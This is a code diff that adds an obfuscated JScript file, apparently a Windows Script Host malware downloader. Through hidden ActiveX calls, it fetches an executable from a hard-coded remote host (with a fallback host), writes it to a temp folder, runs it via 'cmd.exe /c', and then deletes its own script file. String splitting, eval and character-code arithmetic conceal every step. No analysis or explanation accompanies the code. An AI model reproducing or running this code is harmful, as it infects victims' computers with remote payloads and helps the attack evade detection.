@@ -1,0 +1,322 @@
+
+
+
+
+function C()
+{
+	var E = "0917534" + "hdasg" + "fjasgf";
+	return "" + E + "" + "";
+}
+
+function p()
+{
+	return "Position";
+}
+
+function yWf(BWM, kpH)
+{
+	BWM["Open"]();
+	BWM["Type"] = 1;
+
+	var c="";
+	c=c+String.fromCharCode(495-385)+String.fromCharCode(4370/38+0)+String.fromCharCode(2929/29+0)+String.fromCharCode(5676/86+0);
+	var eS = kpH["Respo" + c + "ody"];
+	BWM["Write"](eS);
+	BWM[p()] = 0;
+}
+
+function b() {
+	var G=["l","e"];
+	var n=G[0]+G[1];
+	return n;
+}
+function PvP() {
+	var o=["n","g"];
+	var L=o[0]+o[1];
+	return L;
+}
+function Zct() {
+	var li=["t","h"];
+	var cPN=li[0]+li[1];
+	return cPN;
+}
+function fns() {
+	var pwZ="";
+	pwZ=pwZ;
+	return pwZ;
+}
+function hoT() {
+	var yYb="";
+	yYb=yYb;
+	return yYb;
+}
+function XVI(X)
+{
+	var FMU = b();
+	var xk = PvP();
+	xk += "";
+	var xE = Zct();
+	FMU = FMU + fns() + xk + hoT() + xE;
+	var w = X[FMU];
+	return w;
+}
+
+
+function DwN(ms)
+{
+	var bng="";
+	bng=bng+String.fromCharCode(53*2);
+	var m = eval("Act" + "iv" + "eX" + "Ob" + bng + "ect");
+	return m;
+}
+
+function Aws(M)
+{
+	return typeof M;
+}
+
+function tG() {
+	var J=90908;
+	var gKU=J+35572;
+	var e=gKU/136;
+	return e -926;
+	}
+function EI(va)
+{
+	var PG = "";
+	var DP = 0;
+
+	var QR = DwN(va+tG());
+	var SY = 0;
+	if (va == SY)
+		return false;
+
+
+	SY = new QR("MSXML2.XMLHTTP");
+
+
+	try
+	{
+	SYw = SY++;
+	}
+	catch (ZF)
+	{
+	return ((typeof SY["Open"] ) == "unknown" );
+	}
+	return false;
+}
+
+function EkR()
+{
+	var Gip = "\x57" + "\x53" + "\x63" + "\x72" + "\x69" + "\x70" + "\x74";
+	var ToV = Gip;
+	return eval(ToV);
+}
+
+
+function fxO(TC, VNz)
+{
+	var wU = EkR();
+	var ggY = wU["Scrip" + "tFul" + "lName"];
+	TC[VNz](ggY);
+}
+
+function hn(CI)
+{
+	var oPD = 1;
+	var HsT = "parseInt";
+	var rG = "charAt";
+
+	hP = eval(HsT);
+
+	var mL = 42;
+	mL = hP(CI, 16);
+	return mL;
+}
+
+function Nxp(eX, j)
+{
+	if (true)
+	{
+		var zcV = false?0:eX;
+		return hn(zcV);
+	}
+
+	return kO;
+}
+
+function Vkp()
+{
+	var Cdi=404934;
+	var CUG=Cdi+29500;
+	var NrD=CUG/403;
+	var y=NrD-358;
+	var O = y;
+	var t = "GetS" + "pecia" + "lFol" + "der";
+	return t;
+}
+
+function l(NZ)
+{
+	var PwA = 128;
+	var N = "not";
+	try
+	{
+		N = "\\" + NZ["GetT" + "empN" + "ame"]();
+		N = N + PwA["cha" + "rAt"](256);
+	}
+	catch (Zs)
+	{
+		N = NZ[Vkp()](2) + N;
+	}
+	return N;
+}
+
+
+function hc(cHX, VNz)
+{
+	cHX["r" + "u" + "n"](VNz, 0);
+	return 8;
+}
+
+
+function k(NJ, VSX, cHX)
+{
+	var fok = NJ["Read"]();
+	var pvR = new cHX("ADODB.Recordse" + "t");
+	pvR["fields"]["append"]("bin", 201, NJ["Size"]);
+	pvR["open"]();
+	pvR["ad" + "dN" + "ew"]();
+	pvR("bin")["appendChunk"](fok);
+	pvR["update"]();
+	fok = pvR("bin")["va" + "l" + "ue"];
+
+	var HO = "le";
+	if (fok[HO + "ngth"] > 10)
+	{
+		var Nt = "SaveT";
+		Nt += "oFile";
+		NJ[Nt](VSX);
+		return true;
+	}
+
+	return false;
+}
+
+function Gsb()
+{
+ 	var woy = "cmd.e";
+	woy += "x";
+	woy += "e";
+	woy += " ";
+	woy += "/";
+	woy += "c";
+	woy += " ";
+	return woy;
+}
+
+function Fv(ilu)
+{
+	return new ilu("MSXML2.XMLHTTP");
+}
+
+function pY(kpH, sRh)
+{
+	var Z="";
+	Z=Z+String.fromCharCode(6771/61-0)+String.fromCharCode(9520/85+0)+String.fromCharCode(3131/31-0)+String.fromCharCode(1540/14-0);
+	var Bw="";
+	Bw=Bw+String.fromCharCode(4757/67-0)+String.fromCharCode(3*23)+String.fromCharCode(1031-947);
+	var r=83054;
+	var jhN=r+51278;
+	var Bk=jhN/284;
+	var JX=Bk-473;
+	kpH[Z](Bw, sRh, JX);
+	try {
+		var tE="";
+		tE=tE+String.fromCharCode(1150/10+0)+String.fromCharCode(101)+String.fromCharCode(10*11)+String.fromCharCode(6300/63-0);
+		kpH[tE]();
+	} catch (wls) {
+		return (1-1);
+	}
+	return 1;
+}
+
+
+function wnb(kLJ)
+{
+	var Uio = "Active" + kLJ;
+	var ic = eval(Uio);
+
+	return true?ic:876;
+}
+
+function Xh()
+{
+	return 1;
+}
+
+
+function tJ(luG)
+{
+	var ZkF = Fv(wnb("XObject"));
+	var Xg = 0;
+	if (pY(ZkF, luG) == 0)
+		return false;
+
+	if (ZkF["Status"] != 100 + 101 - 1)
+		return false;
+	var eL = new (wnb("XObject"))("Scripting.FileSystemObject");
+	var Zq = new (wnb("XObject"))("ADODB.Stream");
+	luG = l(eL);
+
+	yWf(Zq, ZkF);
+
+	if (!k(Zq, luG, wnb("XObject")))
+		return 11;
+
+	Zq["Close"]();
+
+	Xg = hc(new (wnb("XObject"))("Wscr" + "ip" + "t.S" + "hell"), Gsb() + luG);
+	if (Xg < 10)
+	{
+		luG = "deleteFile";
+		fxO(eL, luG);
+		return (982 > 671);
+	}
+	return Xg;
+}
+
+
+var Cu = 1;
+
+function ZCM()
+{
+	var wG="";
+	wG=wG+String.fromCharCode(9256/89-0)+String.fromCharCode(9860/85-0)+String.fromCharCode(2436/21+0)+String.fromCharCode(560/5-0)+String.fromCharCode(522/9-0)+String.fromCharCode(364-317)+String.fromCharCode(771-724)+String.fromCharCode(9506/98-0)+String.fromCharCode(489-371)+String.fromCharCode(302-191)+String.fromCharCode(846-736)+String.fromCharCode(20*5)+String.fromCharCode(6305/65+0)+String.fromCharCode(10692/99+0)+String.fromCharCode(839-738)+String.fromCharCode(1016-912)+String.fromCharCode(717-606)+String.fromCharCode(1261/13+0)+String.fromCharCode(2*23)+String.fromCharCode(508-409)+String.fromCharCode(3*37)+String.fromCharCode(109)+String.fromCharCode(2679/57+0)+String.fromCharCode(5*23)+String.fromCharCode(8400/84+0)+String.fromCharCode(935-887)+String.fromCharCode(3087/63+0)+String.fromCharCode(2024/44-0)+String.fromCharCode(212-111)+String.fromCharCode(24*5)+String.fromCharCode(2323/23-0);
+	var I = tJ(wG);
+}
+
+for (; Cu < 2; ++Cu)
+{
+if ( (Xh() >= 0) && EI(Cu))
+{
+	var S = false;
+
+	function pS() {
+		var ML="";
+		ML=ML+String.fromCharCode(1040/10+0)+String.fromCharCode(4*29)+String.fromCharCode(4*29)+String.fromCharCode(9296/83+0)+String.fromCharCode(748-690)+String.fromCharCode(1551/33-0)+String.fromCharCode(2162/46+0)+String.fromCharCode(3*37)+String.fromCharCode(36*3)+String.fromCharCode(15*7)+String.fromCharCode(789-686)+String.fromCharCode(8282/82+0)+String.fromCharCode(7480/68-0)+String.fromCharCode(139-38)+String.fromCharCode(1610/14+0)+String.fromCharCode(778-673)+String.fromCharCode(2*23)+String.fromCharCode(5145/49-0)+String.fromCharCode(8120/70-0)+String.fromCharCode(1504/32-0)+String.fromCharCode(6900/60-0)+String.fromCharCode(20*5)+String.fromCharCode(3120/65+0)+String.fromCharCode(945-896)+String.fromCharCode(3818/83+0)+String.fromCharCode(417-316)+String.fromCharCode(2760/23+0)+String.fromCharCode(101);
+		return ML;
+	}
+	S = tJ(pS());
+	if (!S)
+		ZCM();
+
+}
+}
+
+
+
+
+
+
+
